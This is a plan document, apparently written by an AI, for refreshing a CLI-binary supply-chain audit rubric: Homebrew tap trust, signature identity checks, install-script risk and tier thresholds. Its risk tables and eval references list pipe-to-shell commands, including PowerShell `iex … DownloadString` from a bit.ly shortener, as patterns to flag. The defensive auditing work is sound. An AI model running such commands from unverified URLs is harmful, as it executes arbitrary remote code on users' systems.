# cli-binary Rubric Refresh

> **Status:** Complete
> **Completed:** 2026-10-16
> **Walkthrough:** 2610162006-cli-binary-rubric-refresh-walkthrough.md
> **Author:** Claude (Opus)
> **Parent:** 2610161928-stewardship-review-container-cli-desktop-eval.md
> **Source:** 2610161928-stewardship-review-container-cli-desktop-eval.md §5.B (B1–B7) + X1/X2/X3 subject parts | Hand-off row "cli-binary" + "§4.3 plug-in" row of 2610161941-shared-version-integrity-floor-plan.md | Hand-off row "cli-binary refresh" of 2610162004-generic-fallback-and-classifier-refresh-plan.md (G-3: PowerShell forms, opaque URLs, eval 34) | human decision C6 (relayed by orchestrator)
> **Related Projex:** 2610161941-shared-version-integrity-floor-plan.md / -walkthrough.md (contract this fills; landed on base `20843cc`) | 2610162004-container-image-rubric-refresh-plan.md, desktop-app sibling (same review; Homebrew casks are desktop's) | 2610162004-generic-fallback-and-classifier-refresh-plan.md (owns `references/classifier.md`; see Hand-off) | 2610161852-dispatcher-rubric-consistency-walkthrough.md (prior "abandoned" follow-up)
> **Worktree:** Yes
> **Log:** 2610162006-cli-binary-rubric-refresh-log.md

---

## Summary

Refresh the cli-binary rubric to Oct 2026 reality and fill its §4.6 plug-ins. Today it credits a signature when it is merely *present* (X1/B7). It also treats every `brew install` as homebrew-core, so taps are missed (B1). It lacks GitHub immutable releases and attestations (B2), gets nvm and Volta facts wrong (B3), and has no rule for install-command lures or for the bytes that actually execute (B4). It rejects abandoned projects outright, against the tree (B5), and it can't tell a verified copy from an unverifiable mirror (B6). One more defect showed up while planning: the workflow's `### §4.6 Alternatives & Ecosystem Fit` heading now collides with the shared `references/criteria.md` §4.6 Version & Update Integrity.

**Scope:** `references/criteria/cli-binary.md` + `workflows/cli-binary.md` only.
**Estimated Changes:** 2 files. Addendum: 4 sections rewritten + 2 new sections (§4.3 plug-in, §4.6 plug-in). Workflow: 2 regions rewritten (Identify/Evidence; Rubric/Verdict Notes).

---

## Objective

### Problem / Gap / Need

| ID | Gap (verified at base `20843cc`) | Fix |
|---|---|---|
| X1/B7 | Addendum L44 "Sigstore cosign (keyless) … Transparency log (Rekor) provides audit trail"; L54 "signature + checksum = strong positive"; workflow L142 bare `cosign verify-blob` | Credit only identity-matched verification (§4.6 V2); per-method commands with identity flags |
| X2 | Only *project* age (Tier 3 "First release < 30 days", L131) | V1 plug-in: publish-time source, version unit, condition wording |
| X3 | Workflow runs `cosign`/`slsa-verifier` unpinned | Cite the `references/criteria.md` audit-tooling note |
| B1 | One "Homebrew core formula" row (addendum L15, workflow L40, L257). No tap row. Trust credited to the "build-from-source option" | Split core vs third-party tap. Core = maintainer review + Homebrew-CI bottle, used as the V2 **curated pipeline**. Tap = the tap owner's trust |
| B2 | No immutable releases, `gh release verify`, `gh attestation verify` | Signature-table rows + workflow commands |
| B3 | Workflow L196 "Node.js Foundation for nvm"; L259 "rustup, volta … from established foundation"; addendum L21 | nvm = OpenJS Foundation project; rustup = Rust project; Volta unmaintained → Abandoned; add mise/fnm/uv |
| B4 | "known vendor + HTTPS" (addendum L22). "Download the script … Read it" (workflow L133) without hashing the executed bytes. No lure pattern | URL-provenance rule, lure → CRITICAL, executed-bytes rule |
| B5 | Workflow L242 Toward REJECTED "Project abandoned…" vs tree "Abandoned with no alternative → CONDITIONAL" and the landed `criteria.md` §4.2 | Move the item to Toward CONDITIONAL; REJECTED only with another REJECTED trigger |
| B6 | Eval 30 ambiguity: Toward REJECTED "third-party mirror or repackager" vs Toward CONDITIONAL "informal channel" | Verified-bytes rule: bytes matching the vendor's *signed* checksum → channel is a note; unverified → CONDITIONAL with a verify condition; unverifiable → REJECTED |
| C6 (cli part) | No own-code / third-party line for static binaries | `## Own Code vs Third-Party Components (§4.3)` plug-in |
| NEW | Workflow L223 `### §4.6 Alternatives & Ecosystem Fit` now names the wrong §4.6 | Rename to `### Alternatives & Ecosystem Fit`; add `### §4.6 Version & Update Integrity` |
| G-3 (sibling hand-off) | The classifier plan routes PowerShell pipe-to-shell (`irm … \| iex` etc.) and eval 34 (forum `iex … DownloadString('http://bit.ly/…')`) to cli-binary. This rubric names neither the PowerShell forms nor opaque URLs | PowerShell rows in the Identify + script-risk tables, PowerShell executed-bytes commands, and an opaque/plain-HTTP-URL pipe-to-shell bullet → CRITICAL (Toward REJECTED) |

### Success Criteria

- [ ] Addendum has exactly one `## Version & Update Integrity (§4.6)` with bullets starting `- **V1**` … `- **V5**` (5 total), and exactly one `## Own Code vs Third-Party Components (§4.3)`.
- [ ] Addendum V2 bullet names the **curated pipeline** (homebrew/core) with the auditor's checks (tap resolution + formula `url`).
- [ ] Both files: separate `Homebrew core formula` and `Homebrew third-party tap` channel rows.
- [ ] Commands present: `gh release verify`, `gh release verify-asset`, `gh attestation verify`, `cosign verify-blob --bundle` with `--certificate-identity` + `--certificate-oidc-issuer`, `slsa-verifier verify-artifact` with `--source-uri`.
- [ ] Stale strings gone from both files: `Node.js Foundation` | `from established foundation` | `build-from-source option` | `provides audit trail` | `### §4.6 Alternatives` | the old workflow step "`cosign verify-blob` or transparency log".
- [ ] The workflow `### Toward REJECTED` section contains no "abandoned". `### Toward CONDITIONAL` contains it with the REJECTED-only-with-another-trigger clause.
- [ ] Every `§4.6 V<n>` in both files is V1–V5.
- [ ] `python3 evals/run_evals.py validate` passes. `python3 -m unittest discover -s evals -p "test_*.py"` passes with the Preflight test count.
- [ ] Paper traces T1–T14 give the stated verdicts.
- [ ] `git diff --stat <base>..HEAD` lists exactly the 2 files. `evals/`, `SKILL.md`, `references/criteria.md`, `references/classifier.md` untouched.

### Out of Scope

- `references/classifier.md` and the `SKILL.md` Type 7 row (tap routing, "volta" example, "build-from-source" wording): classifier plan (Hand-off).
- Homebrew **casks**: desktop-app plan.
- `evals/`: eval plan (Notes → Eval hand-off). Live paid eval run: once, after all refreshes (human decision).
- Shared §4.6/§4.3 text and `STEWARDSHIP.md` dates (orchestrator).
- The tension between "known-vendor install script → CONDITIONAL" and "language-version manager → APPROVED". It predates this plan and was not raised by the review, so it is left as-is.

---

## Context

### Current State

- Neither file has changed since 2026-04-15 apart from the `5c44b79` header lines. Workflow: 262 lines / 13,057 B. Addendum: 133 lines / 8,755 B.
- The floor landed on base as `20843cc`. It adds `references/criteria.md` §4.6 V1–V5 with `**Addendum:**` lines, the plug-in heading convention `## Version & Update Integrity (§4.6)` with bullets labelled `V1`–`V5`, V2 **Curated pipelines**, and the §4.3 Blocking CVE table + Own code / Fixed release / KEV / VEX definitions + `**Addendum:**` line. It also adds the audit-tooling note ("**Audit tooling is itself a dependency.**"), the §4.2 "Abandoned → CONDITIONAL" alignment, and the `SKILL.md` Blocking CVE term and floor precedence.
- `SKILL.md` precedence: addendum "More-specific guidance wins" doesn't apply to §4.6. Toward REJECTED items are rated CRITICAL → REJECTED (Tree terms "CRITICAL flag").
- `SKILL.md` Red Flag "Confirmed typosquat / impersonation" covers namespace impersonation. The plan applies it to lookalike install domains.
- No code parses these files. `evals/run_evals.py` only globs `workflows/*.md` stems and snapshots `workflows/` + `references/`.
- Evals routed here: 20 (`brew install ripgrep` → APPROVED, Tier 1), 21 (`curl … | sudo bash` unknown → REJECTED), 30 (terraform on a colleague's share → CONDITIONAL).

### Verified facts used (primary unless marked)

| Fact | Source (checked 2026-10-16) |
|---|---|
| homebrew-core: every change is a human-reviewed PR. Source `sha256` is pinned in the reviewed formula. Bottles are built from source by Homebrew CI and attested with `actions/attest`. Formula installs run without `sudo`. Third-party taps are "unsupported" and not trusted by default. In the 2026 Trivy compromise the core formula was unaffected | `Homebrew/brew` `docs/Homebrew-Security-and-Supply-Chain.md` (last_review 2026-09-19), HEAD `19fe946` |
| Bottle attestation verification is **opt-in**: `HOMEBREW_VERIFY_ATTESTATIONS` (needs `gh`). Core identity = `Homebrew/homebrew-core` (backfill `trailofbits/homebrew-brew-verify`). Third-party tap bottles verify only against the tap's own repo | same doc; `Library/Homebrew/attestation.rb`, `env_config.rb`, `formula_installer.rb#verify_bottle_attestation?` |
| Since Homebrew 6.0.0, non-official taps need explicit trust (`brew trust`). A fully qualified `brew install user/repo/formula` trusts only that item. Tap Ruby runs with user privileges | `docs/Tap-Trust.md` (last_review 2026-07-18) |
| `brew info` prints `From: <url>`. `brew pin` holds `brew upgrade`. `revision` bumps = dependent rebuilds | `cmd/info.rb`, `cmd/pin.rb`, `docs/Formula-Cookbook.md` |
| `gh release verify [<tag>]` and `gh release verify-asset [<tag>] <file>` exist. `gh release view --json` has `isImmutable`, `publishedAt`, `author`. `gh attestation verify` needs `--owner` or `--repo`; use `--signer-workflow`/`--signer-repo` for reusable workflows | `cli/cli` HEAD (2026-10-16) `pkg/cmd/release/{verify,verify-asset,shared}`, `pkg/cmd/attestation/verify/verify.go` |
| Immutable releases: assets and tag cannot change after publish. A release attestation is generated automatically. Only releases published while immutability is enabled are covered; source zip/tarball not verifiable | docs.github.com "immutable releases" / "verify release integrity" (search summary — Secondary) |
| `cosign verify-blob --bundle <f> --certificate-identity <id> --certificate-oidc-issuer <iss> <blob>` is the documented keyless form | `sigstore/cosign` `doc/cosign_verify-blob.md` HEAD (2026-10-16) |
| `slsa-verifier verify-artifact --provenance-path <p> --source-uri github.com/<org>/<repo> [--source-tag <t>]` | `slsa-framework/slsa-verifier` README (2026-08-06) |
| "**Volta is unmaintained.** … We recommend migrating to `mise`" (issue #2080) | `volta-cli/volta` README, last commit 2025-11-15 |
| nvm is copyright OpenJS Foundation | `nvm-sh/nvm` README |

### Key Files

| File | Role | Change Summary |
|---|---|---|
| `references/criteria/cli-binary.md` | cli-binary scoring addendum | Header precedence note; channel table (core vs tap, version managers, shared copy); signature table (identity-bound, gh/cosign/slsa commands, bottle attestation); install-script rules (URL provenance, lures, executed bytes); tier thresholds; + §4.3 and §4.6 plug-ins |
| `workflows/cli-binary.md` | cli-binary workflow | Header/intro lists; Identify (tap, command source, expected identity); tier triage; research + verification commands; coverage table; rubric (§4.6 heading collision); verdict notes (B1/B3–B6) |

### Dependencies

- **Requires:** floor on base (`20843cc` or later). Preflight verifies.
- **Concurrent:** the other refresh plans touch their own files only. The classifier plan owns `references/classifier.md` + `SKILL.md` Step 0. No overlap.
- **Blocks:** eval-refresh plan (cli cases), the single paid live run.

### Constraints

- Plug-ins may tighten §4.6 and §4.3, never loosen them. No change to the verdict classes.
- Dated facts carry "as of 2026-10". Tool versions stay out of scoring tables.
- Workflow prose wraps at ~72–75 cols. Tables and addendum bullets may be long lines (existing style). Pipes inside table cells are escaped as `\|` (as in the addendum; the workflow L45–46 cells are currently unescaped and render broken, so this plan fixes them).
- No projex filenames in shipped files.

### Assumptions

- **A1:** Base still matches the line ranges below. The floor did not touch these 2 files (`git diff 97f6bce..20843cc --stat` excludes them). Preflight re-checks the anchors.
- **A2:** `govulncheck -mode=binary` and `cargo audit bin` still exist as named. Verify at execution with `go doc`/`--help` or the project docs. If either can't be confirmed, drop that tool name from the Step 4 §4.3 plug-in and keep the generic "binary-metadata scanners" clause.
- **A3:** ripgrep's latest release is ≥ 7 d old on the eval date (eval 20 Tier 1). This is time-dependent and belongs to the eval plan.

### Impact Analysis

- **Direct:** the 2 files.
- **Adjacent:** classifier routing of tap formulae (Hand-off). The desktop-app plan rates casks with the same Homebrew facts.
- **Downstream:** live verdicts change as follows:
  - Third-party taps lose Tier 1 and core-level credit.
  - Bare "signed" releases lose credit until identity is matched.
  - Abandoned → CONDITIONAL, not REJECTED.
  - Verified shared copies can reach APPROVED.
  - Lure commands → REJECTED.

---

## Implementation

### Overview

Preflight → addendum (Steps 1–4) → workflow (Steps 5–6). Each step replaces a whole region bounded by exact anchor lines (the first line kept *outside* the region is given) with the `After` text verbatim. Line numbers are for base `20843cc`. If an anchor doesn't match, re-read the region. Don't improvise.

**Preflight** (`<work-root>`):
```bash
grep -c "^## 4.6 Version & Update Integrity (shared floor)" references/criteria.md   # 1
grep -c '`## Version & Update Integrity (§4.6)`' references/criteria.md               # 1 (plug-in convention)
grep -c "^- \*\*Curated pipelines:\*\*" references/criteria.md                        # 1
grep -c "Audit tooling is itself a dependency" references/criteria.md                 # 1
grep -c "^- \*\*Blocking CVE\*\*" SKILL.md                                            # 1
grep -n "Flag as Abandoned → CONDITIONAL\*\*" references/criteria.md                  # 1 hit
wc -l workflows/cli-binary.md references/criteria/cli-binary.md                       # 262 / 133
python3 evals/run_evals.py validate | head -3                                         # pass
python3 -m unittest discover -s evals -p "test_*.py" 2>&1 | tail -3                   # record count
```
Any floor check ≠ expected → set this plan `Blocked` (floor not landed) and stop.

---

### Step 1: Addendum header + Distribution Channel Trust Signals

**Objective:** B1 (core vs tap), B3 (version-manager facts), B4 (known-vendor script row), B6 (shared copy).
**Confidence:** High
**Depends on:** Preflight
**Do-Projex:** Encouraged
**Verify-Projex:** Encouraged

**Files:** `references/criteria/cli-binary.md`

**Changes:** replace L1–37 (from `# CLI Binary — Criteria Addendum` through the last `### Scoring impact` bullet `- Third-party mirror = strong negative …`; keep the blank line before `## Signature & Checksum Standards`) with:

```markdown
# CLI Binary — Criteria Addendum

Per-subject scoring extensions for **Type 7: cli-binary** audits.
Layers on top of `references/criteria.md`. More-specific guidance wins,
except over the §4.6 version-integrity floor and the §4.3 Blocking CVE
classes: this file only tightens or fills those.

Covers: GitHub Releases binaries, vendor-hosted executables, Homebrew
formulae (homebrew/core and third-party taps), language-version and
toolchain managers (nvm, pyenv, rustup, mise, fnm, uv), install
scripts (curl-pipe-bash), and GoReleaser-built releases.
Cross-platform: Windows, macOS, Linux. Homebrew casks are desktop-app.

Platform facts below are as of 2026-10; re-check them at each
stewardship review.

## Distribution Channel Trust Signals

| Channel | Verification Gate | Adoption Metric | Trust Notes |
|---------|-------------------|-----------------|-------------|
| Homebrew core formula (name resolves to tap `homebrew/core`) | Every formula change is a PR reviewed and merged by a Homebrew maintainer; source `sha256` pinned in the reviewed formula; bottles built from source by Homebrew CI and attested | Install count via `brew` analytics | Trust anchor = Homebrew review + Homebrew CI build, not an upstream-uploaded binary. Formula installs never use `sudo`. Curated pipeline for §4.6 V2 (§ Version & Update Integrity) |
| Homebrew third-party tap (`brew install <user>/<tap>/<name>`, or `brew tap <user>/<tap>` then the short name) | None from Homebrew: the tap is its owner's GitHub repo, its Ruby runs with the user's privileges when loaded, and Homebrew calls third-party taps unsupported. Since Homebrew 6.0.0 untrusted taps are not loaded until trusted (`brew trust`; a fully qualified install trusts that one item) | Tap repo stars | Trust = the tap owner. Tap named in the upstream project's own docs → rate as that vendor's GitHub Releases / vendor-hosted channel. Any other tap → third-party repackager. `brew trust` records consent, not review |
| GitHub Releases (org-owned, CI-built) | CI-built assets; checksum file; signature or attestation | Download count per asset | Highest GitHub trust once identity verifies per §4.6 V2 (the project's repo + release workflow). Immutable release = assets and tag cannot change after publish |
| GitHub Releases (personal, manual) | Author-uploaded assets; no CI provenance | Download count per asset | Lower trust — single author, no build reproducibility guarantee |
| GoReleaser / release automation | CI-built; `checksums.txt` auto-generated; optional Sigstore signing | Download count | Standard checksum file; signing optional — credit only verified identity |
| Vendor-hosted binary (signed) | Vendor website + GPG/Sigstore/Minisign signature | Website traffic / brand | Trust = vendor identity + a signature that verifies against the vendor-documented key or identity |
| Vendor-hosted binary (unsigned) | Vendor website only; no signature | Website traffic / brand | Trust depends entirely on vendor identity; no cryptographic verification |
| Language-version / toolchain manager (rustup, nvm, pyenv, mise, fnm, uv) | Project-maintained installer (e.g. rustup: Rust project; nvm: OpenJS Foundation project) | GitHub stars + community adoption | Governance is a maintenance signal, not install-time verification: rate the installer as an install script (§ Install Script Risk) and by §4.6 V2. Check maintenance status — Volta's maintainers declared it unmaintained (README, Nov 2025) and recommend mise |
| Install script (curl-pipe-bash) — known vendor | Script URL listed in the vendor's own docs or repo README | Script content auditable | Pipe-to-shell bypasses verification, and a server can send different bytes to `curl \| sh` than to a browser. Mitigated only by a URL traced to vendor docs + the executed-bytes rule (§ Install Script Risk) |
| Install script (curl-pipe-bash) — unknown source | Unknown or unverified source | None | Highest risk: arbitrary code execution, no verification, no rollback |
| Third-party mirror / repackager / shared copy (file host, network share, chat attachment) | Non-vendor distribution | None | Unverified bytes = highest risk. Bytes whose SHA-256 matches the vendor's **signed** checksum file for that exact version (signature verified per §4.6 V2) → channel risk drops to a note |

### Scoring impact

- Homebrew core formula = strong positive (maintainer review + Homebrew CI build + pinned checksum); counts as verified identity for Tier 1 via the curated pipeline (§ Version & Update Integrity, V2)
- Homebrew third-party tap = no Homebrew credit; score as the tap owner's channel (vendor-documented tap → vendor channel; otherwise third-party repackager)
- GitHub Releases org/CI-built with checksums and identity verified (§4.6 V2) = strong positive; immutable release = additional positive
- GitHub Releases org/CI-built with checksums, identity not verifiable = moderate positive
- GoReleaser with checksums.txt = moderate positive; strong only with verified identity
- Language-version / toolchain manager (maintained, established) = moderate positive; declared unmaintained = Abandoned (`references/criteria.md` §4.2 → CONDITIONAL)
- Vendor-hosted with signature verified against the vendor-documented key or identity = moderate positive
- GitHub Releases personal/manual with checksums = moderate positive
- Vendor-hosted unsigned = weak positive at best (vendor reputation only)
- curl-pipe-bash from known vendor, URL traced to vendor docs = LOW-MEDIUM flag (pipe-to-shell risk, mitigated by vendor)
- curl-pipe-bash from unknown source, or URL not traceable to vendor docs = HIGH flag
- Install-command lure (§ Install Script Risk) = CRITICAL; lookalike vendor domain = `SKILL.md` Red Flag "Confirmed typosquat / impersonation"
- Third-party mirror / shared copy, bytes unverified = strong negative; bytes verified against the vendor's signed checksum = note only
```

**Rationale:**
- B1: the facts come from Homebrew's own security doc. Credit for "build-from-source option" was wrong, because users install bottles and the trust is in review + CI.
- Taps: whether a tap is vendor-documented decides the rating. A vendor tap carries vendor-direct risk (in the Trivy compromise the vendor tap was hit and core was not; review evidence #7, Secondary). An undocumented tap is a repackager.
- B3: these are factual fixes. "Foundation" governance gives no install-time assurance.
- The header precedence clause repeats `SKILL.md` precedence where addendum readers see it first.

**Verification:** `grep -c "Homebrew third-party tap" references/criteria/cli-binary.md` ≥ 2; `grep -ci "build-from-source option\|Node.js Foundation" references/criteria/cli-binary.md` → 0; the next line after the block is blank and then `## Signature & Checksum Standards`.

**If this fails:** `git -C <work-root> checkout -- references/criteria/cli-binary.md` and redo.

---

### Step 2: Addendum Signature & Checksum Standards (identity-bound)

**Objective:** X1/B7, B2: credit only verification matched to an expected identity, and give the exact commands.
**Confidence:** High (commands checked against source docs); Medium (immutable-release coverage detail, Secondary)
**Depends on:** Step 1
**Do-Projex:** Encouraged
**Verify-Projex:** Encouraged

**Files:** `references/criteria/cli-binary.md`

**Changes:** replace the region from `## Signature & Checksum Standards` through `- No checksum or signature = MEDIUM-HIGH flag (no verification path)` (base L39–59) with:

```markdown
## Signature & Checksum Standards

Credit a signature or attestation only when it verifies **and** names the expected identity (§4.6 V2; § Version & Update Integrity says where that identity comes from). `<owner>/<repo>` below = the repo the vendor documents as the source.

| Method | Strength | Verification |
|--------|----------|--------------|
| GitHub release attestation (immutable release) | Strong | `gh release verify <tag> -R <owner>/<repo>`, then `gh release verify-asset <tag> <file> -R <owner>/<repo>`. Covers only releases published while immutability was enabled; source zip/tarball not covered. `gh release view <tag> -R <owner>/<repo> --json isImmutable` shows the state |
| GitHub artifact attestation (`actions/attest`) | Strong | `gh attestation verify <file> --repo <owner>/<repo>`; add `--signer-workflow <owner>/<repo>/.github/workflows/<file>` when the vendor documents its release workflow (for a reusable workflow, `--signer-workflow` or `--signer-repo` is required) |
| Sigstore bundle / cosign keyless | Strong | `cosign verify-blob --bundle <bundle> --certificate-identity <identity> --certificate-oidc-issuer <issuer> <file>`. For GitHub Actions signing: identity = `https://github.com/<owner>/<repo>/.github/workflows/<file>@refs/tags/<tag>`, issuer = `https://token.actions.githubusercontent.com`. A transparency-log (Rekor) entry alone only shows that *someone* signed |
| SLSA provenance attestation | Strong | `slsa-verifier verify-artifact <file> --provenance-path <provenance> --source-uri github.com/<owner>/<repo>` (add `--source-tag <tag>`) |
| Homebrew bottle attestation | Strong | Homebrew checks bottles against the `Homebrew/homebrew-core` CI identity only when `HOMEBREW_VERIFY_ATTESTATIONS` is set (needs `gh`; opt-in as of 2026-10). Third-party tap bottles verify only against the tap's own repo |
| GPG detached signature (.asc/.sig) | Strong | Verify with the vendor's key; match its fingerprint against vendor docs reached on a channel other than the download server |
| Minisign | Strong | Ed25519; verify with the public key the vendor publishes in its docs or repo, not only beside the binary |
| Signed checksum file (e.g. `SHA256SUMS` + `.sig`) | Strong | Verify the checksum file's signature per its method's row, then the binary's hash against it |
| SHA-256 checksum file | Moderate | Integrity check only (no authenticity); depends on checksum file's own provenance |
| SHA-512 checksum file | Moderate | Same as SHA-256 with larger hash; same provenance caveat |
| MD5 checksum | Weak | Collision-vulnerable; legacy only; treat as absent if no SHA-256+ alternative |
| No checksum or signature | Absent | No verification possible; binary provenance unknowable |

Run `gh`, `cosign`, `slsa-verifier`, `gpg` and `minisign` under the audit-tooling note in `references/criteria.md`. If you cannot run a check, record `Not available (<why>)` and give no identity credit.

### Scoring impact

- Signature/attestation verified against the expected identity + checksum = strong positive (origin, not safety: never enough alone for APPROVED or Tier 1)
- Verified SLSA provenance or GitHub artifact/release attestation = strong positive
- Signature/attestation present but unverified, or identity not matched = note only, no credit
- Identity names a different repo, workflow, key or signer than vendor docs or the previous release = HIGH flag (§4.6 V3)
- Signed checksum file verified = strong positive
- SHA-256/SHA-512 checksum only (served over HTTPS from same origin) = moderate positive
- Checksum hosted separately from binary (different domain/channel) = stronger than co-hosted
- MD5 only = weak positive (note collision vulnerability)
- No checksum or signature = MEDIUM-HIGH flag (no verification path)
```

**Rationale:** X1 states the principle that a signature counts only when it binds to the expected identity. Each row now carries the identity-binding flag that makes it meaningful (`--repo`, `--certificate-identity`, `--source-uri`, fingerprint). No tool versions go in the table (review Risk: dated specifics rot). The GoReleaser "single bundle per artifact" claim (B7, Conf M) is left out as unverified. The Sigstore row covers any bundle name.

**Verification:** `grep -c "certificate-oidc-issuer\|--source-uri\|gh release verify-asset\|gh attestation verify" references/criteria/cli-binary.md` ≥ 4; `grep -c "provides audit trail" …` → 0.

**If this fails:** revert to the post-Step-1 state (`git -C <work-root> diff` to inspect) and redo.

---

### Step 3: Addendum Install Script Risk + Provenance Assessment

**Objective:** B4: install-URL provenance, lure patterns, the executed-bytes rule. Small V3 hooks in Provenance.
**Confidence:** High
**Depends on:** Step 2
**Do-Projex:** Encouraged

**Files:** `references/criteria/cli-binary.md`

**Changes:** replace from `## Install Script Risk Classification` through `- No source + no CI + no signature = weakest provenance, strong negative` (base L61–99) with:

```markdown
## Install Script Risk Classification

| Pattern | Risk | Guidance |
|---------|------|---------|
| `curl -sSL <url> \| sh` (or `bash`) | High | Arbitrary code execution; no verification before execution; MITM risk if not HTTPS; the bytes piped can differ from what a browser shows |
| `curl -sSL <url> \| sudo sh` | Critical | Same as above + root privileges; any compromise has full system access |
| `wget -qO- <url> \| sh` | High | Same risk profile as curl-pipe-sh |
| PowerShell `irm <url> \| iex`, `iwr <url> \| iex`, `iex (irm <url>)`, `iex ((New-Object Net.WebClient).DownloadString('<url>'))` | High | PowerShell pipe-to-shell: same risk profile as curl-pipe-sh; in an elevated (Administrator) session = Critical |
| Download script → inspect → execute **that same file** | Medium | User can audit before running; risk is in the auditing quality |
| Script pinned to a commit (raw URL at a commit SHA) or with a vendor-published checksum/signature | Medium-Low | The audited bytes are the executed bytes |
| Installer binary (self-extracting) | Medium | Opaque; runs arbitrary code; better than pipe-to-shell only because it can be scanned |
| Package manager install (homebrew/core, distro repos) | Low | Package manager mediates: maintainer review, pinned checksum, sandboxing (if any). A third-party Homebrew tap is not mediation (§ Distribution Channel) |
| Build from source | Low | User controls compilation; risk is in the build system (Makefile, cargo, go build) |

**Install-URL provenance.** The exact command and URL must appear in the vendor's own docs or repo README, reached directly. A copy from an ad, sponsored search result, forum, chat or AI answer doesn't count until it matches. A URL that hides the publisher (shortener, redirector, paste site, raw IP) or uses plain HTTP is an unverifiable source: expand a shortener only to report where it points, never to run it. Lookalike of the vendor domain → `SKILL.md` Red Flag "Confirmed typosquat / impersonation".

**Lure patterns (CRITICAL → Toward REJECTED).** The command reached the user via an ad or sponsored result, or a page presents it as a step to paste into Terminal / PowerShell / the Run dialog to "verify you are human", fix an error or unlock content, **and** it is not the vendor's documented install command.

**Executed-bytes rule.** Audit and run the same bytes:
1. Download the script to a file (`curl -fsSLo install.sh <url>`; PowerShell: `Invoke-WebRequest <url> -OutFile install.ps1`).
2. Read that file and record its SHA-256 (`sha256sum` / `Get-FileHash`) in the Version integrity row.
3. If approved, run that file (`sh ./install.sh` / `& .\install.ps1`), never a fresh `curl | sh` or `irm | iex`.
4. Apply the binary rules to anything the script downloads: does it pin a version and check a checksum or signature?

### Scoring impact

- `curl … | sudo sh` from unknown source = automatic Tier 3, push toward REJECTED
- `curl … | sh` from known vendor = Tier 2 minimum, note pipe-to-shell risk; condition or recommendation = executed-bytes rule
- Install-command lure = CRITICAL
- Pipe-to-shell (any shell, incl. PowerShell `iex`) from a URL that hides the publisher or uses plain HTTP = CRITICAL
- `irm … | iex` from known vendor, URL traced to vendor docs = same as `curl … | sh` from known vendor
- Script fetches and runs further remote code with no checksum or signature check = HIGH flag
- Download-then-inspect = moderate (depends on script complexity)
- Build from source available = positive signal (verifiable, auditable)
- Package manager mediation (homebrew/core, distro repos) = positive signal (review layer)

## Provenance Assessment

Assess binary provenance via these signals:

| Signal | Positive indicator | Negative indicator |
|--------|-------------------|-------------------|
| Build system | CI-built (GitHub Actions, etc.) with public workflow | Manual build, no CI, no build config in repo |
| Reproducible builds | Documented build process; deterministic output | "Trust me" binary with no build info |
| Source availability | Open-source repo with matching release tags | Closed-source, no repo, no tag correspondence |
| Release process | Tagged release → CI builds → signed/attested artifacts → checksum file; immutable release | Manual upload of pre-built binary; release author switches between CI and a human (§4.6 V3) |
| SLSA level | SLSA L2+ provenance verified against the project repo | No SLSA attestation |
| Release frequency | Regular releases with changelogs | Sporadic or abandoned releases; release with no matching tag or changelog (§4.6 V3) |

### Scoring impact

- CI-built + open-source + tagged release + identity verified = strongest provenance
- Open-source + manual release + checksum = moderate provenance
- Closed-source + vendor-hosted + signed (identity verified) = moderate provenance (vendor trust)
- No source + no CI + no signature = weakest provenance, strong negative
```

**Rationale:**
- B4: the URL rule needs no named campaign (review evidence #23, Tertiary H), so no incident names enter the shipped text.
- The lure test needs both conditions ("not the vendor's documented command"). Without that, legitimate "paste this in Terminal" install pages, brew.sh's own included, would be rated CRITICAL.
- The executed-bytes rule closes the browser-vs-pipe divergence (review evidence #24, Conf M) without asserting any detection technique.

**Verification:** `grep -c "Executed-bytes rule\|Lure patterns\|Install-URL provenance" references/criteria/cli-binary.md` → 3.

**If this fails:** revert to the post-Step-2 state and redo.

---

### Step 4: Addendum Tier Thresholds + §4.3 and §4.6 plug-ins

**Objective:** tie the tiers to §4.6 and the curated pipeline (B1, X2). Add the §4.3 own-code plug-in (C6) and the §4.6 V1–V5 plug-in (X1–X3, B2, B6).
**Confidence:** High (structure, Homebrew/gh facts); Medium (scanner names, A2)
**Depends on:** Steps 1–3 (section names cited)
**Verify-Projex:** Encouraged

**Files:** `references/criteria/cli-binary.md`

**Changes:** replace from `## Tier Thresholds (CLI Binaries)` to end of file (base L101–133) with:

```markdown
## Tier Thresholds (CLI Binaries)

### Tier 1 — Quick Audit

ALL of these must hold:
- Distributed via Homebrew core formula (tap `homebrew/core`; never a third-party tap) OR GitHub Releases from a well-known org/project
- Identity verified per §4.6 V2: checksum AND a signature or attestation matched to the expected identity, or the homebrew/core curated pipeline (§ Version & Update Integrity)
- Project is established (>= 1 year old, >= 1K GitHub stars or equivalent adoption)
- Maintained: release within last 12 months
- No known security incidents or supply-chain compromises (a resolved past compromise also bars Tier 1: §4.6 V4 case c)
- `references/criteria.md` §4.6 raises nothing that bars Tier 1 (publish time known and >= 7 days; no V3 item)
- No install-script-only distribution (binary download available)

### Tier 2 — Standard Audit (default)

Default when not all Tier 1 criteria are met:
- Distributed via a recognizable channel (GitHub Releases, vendor site, Homebrew core, or a Homebrew tap the vendor documents)
- Checksum available (signature not required)
- Identifiable author or organization
- No unresolved security incidents
- Project available > 30 days

### Tier 3 — Deep Audit

ANY of these triggers:
- Install via `curl … | sh`, `curl … | sudo sh` or PowerShell `irm … | iex` (any variant) from any source
- No checksum and no signature for binary download
- Binary from unknown or unverifiable source
- Third-party mirror or repackager (not original author/org), incl. a Homebrew tap the upstream project does not document
- Shared via chat/email/forum link (not discovered via official channel)
- Install command reached via ad, sponsored result or a paste-to-verify page (§ Install Script Risk)
- Single-author project with no CI and no release automation
- First release < 30 days old (project age; version age is §4.6 V1)
- Known prior security incident or supply-chain compromise
- Identity evidence differs from vendor docs or the previous release (§4.6 V3)
- Binary requests elevated privileges (sudo/admin) with unclear justification

## Own Code vs Third-Party Components (§4.3)

Plug-in for `references/criteria.md` §4.3. The verdict classes stay as defined there and in `SKILL.md` "Blocking CVE".

- **Own code:** the project's own source as shipped in the binary (incl. forks it maintains) and the project's install script.
- **Third-party component:** statically linked or vendored libraries (Go modules, Rust crates, bundled C libraries), bundled runtimes or interpreters, and Homebrew dependency formulae.
- **Fixed release:** for a third-party component, a release of this binary (or an update of the Homebrew dependency formula) that ships the fixed component. An upstream library fix that no binary release ships yet is not a fixed release of the subject.
- **Scan sources:** OSV / GHSA for the repo and for the dependency versions in its `go.mod` / `Cargo.lock` at the release tag; vendor advisories. Where available, scanners that read a binary's embedded dependency metadata (`govulncheck -mode=binary <file>` for Go; `cargo audit bin <file>` for Rust binaries built with `cargo auditable`). The audit-tooling note in `references/criteria.md` applies.
